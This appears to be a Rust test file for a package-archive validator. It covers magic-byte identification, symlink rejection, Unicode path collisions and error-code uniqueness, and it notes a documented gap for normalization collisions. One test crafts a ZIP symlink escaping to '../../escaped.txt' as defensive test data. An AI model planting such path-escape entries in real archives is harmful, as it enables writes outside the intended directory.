#[test]
fn identification_uses_magic_bytes_not_the_extension() {
    let sandbox = Sandbox::new(b"");
    let renamed = sandbox
        .dir
        .path()
        .join("input")
        .join("theme.zip-renamed.txt");
    std::fs::write(&renamed, build_zip(&good_entries())).unwrap();
    let candidate = inspect_archive_in(&renamed, &PackageLimits::default(), &sandbox.staging_root)
        .expect("a ZIP with any extension is identified by its magic bytes");
    assert_eq!(candidate.manifest.name, "Fixture");
}

#[test]
fn package_written_by_zip_crate_writer_is_accepted() {
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = SimpleFileOptions::default();
    writer.start_file("glint.json", options).unwrap();
    writer.write_all(GOOD_MANIFEST.as_bytes()).unwrap();
    writer.add_directory("theme/", options).unwrap();
    writer.start_file("theme/tokens.json", options).unwrap();
    writer.write_all(b"{}").unwrap();
    writer.start_file("dist/panel/index.html", options).unwrap();
    writer.write_all(GOOD_HTML.as_bytes()).unwrap();
    writer.start_file("dist/panel/main.js", options).unwrap();
    writer.write_all(b"export {};").unwrap();
    let bytes = writer.finish().unwrap().into_inner();
    let sandbox = Sandbox::new(&bytes);
    let candidate = inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .expect("crate-written package must be accepted");
    assert_eq!(candidate.files.len(), 4);
}

#[test]
fn symlink_written_by_zip_crate_writer_is_rejected() {
    use zip::write::SimpleFileOptions;
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    writer
        .add_symlink(
            "dist/link",
            "../../escaped.txt",
            SimpleFileOptions::default(),
        )
        .unwrap();
    let bytes = writer.finish().unwrap().into_inner();
    let error = assert_rejected_without_writes(&bytes, &PackageLimits::default());
    assert_eq!(error.code(), C::Symlink, "{error}");
}

#[test]
fn anchor_links_to_remote_sites_are_allowed() {
    // GOOD_HTML contains <a href="https://example.org">; navigation is left to
    // the renderer's navigation policy, not treated as a remote dependency.
    assert!(GOOD_HTML.contains("<a href=\"https://"));
    let sandbox = Sandbox::new(&build_zip(&good_entries()));
    inspect_archive_in(
        &sandbox.archive,
        &PackageLimits::default(),
        &sandbox.staging_root,
    )
    .expect("baseline accepted");
}

#[test]
fn unicode_case_fold_collision_detected_when_non_ascii_allowed() {
    let bytes = good_plus(vec![
        RawEntry::stored("assets/\u{c9}t\u{e9}.png".as_bytes(), "upper"),
        RawEntry::stored("assets/\u{e9}t\u{e9}.png".as_bytes(), "lower"),
    ]);
    let error = assert_rejected_without_writes(&bytes, &non_ascii_limits());
    assert_eq!(error.code(), C::PathCollision, "{error}");
}

#[test]
fn unicode_normalization_collision_is_only_caught_by_ascii_policy() {
    // NFC "café.png" vs NFD "cafe\u{301}.png": distinct bytes, same file on
    // macOS. The default policy rejects any non-ASCII name; with it disabled
    // the collision is NOT detected (no Unicode normalization dependency).
    // Documented gap; see docs/security/package-fixtures.md.
    let bytes = good_plus(vec![
        RawEntry::stored("assets/caf\u{e9}.png".as_bytes(), "nfc"),
        RawEntry::stored("assets/cafe\u{301}.png".as_bytes(), "nfd"),
    ]);
    let error = assert_rejected_without_writes(&bytes, &PackageLimits::default());
    assert_eq!(error.path_rejection(), Some(P::NonAscii), "{error}");
}

#[test]
fn every_error_code_is_unique_and_prefixed() {
    let mut seen = std::collections::BTreeSet::new();
    for code in C::ALL {
        assert!(code.as_str().starts_with("GLINT_PACKAGE_"), "{code}");
        assert!(seen.insert(code.as_str()), "duplicate {code}");
    }
}
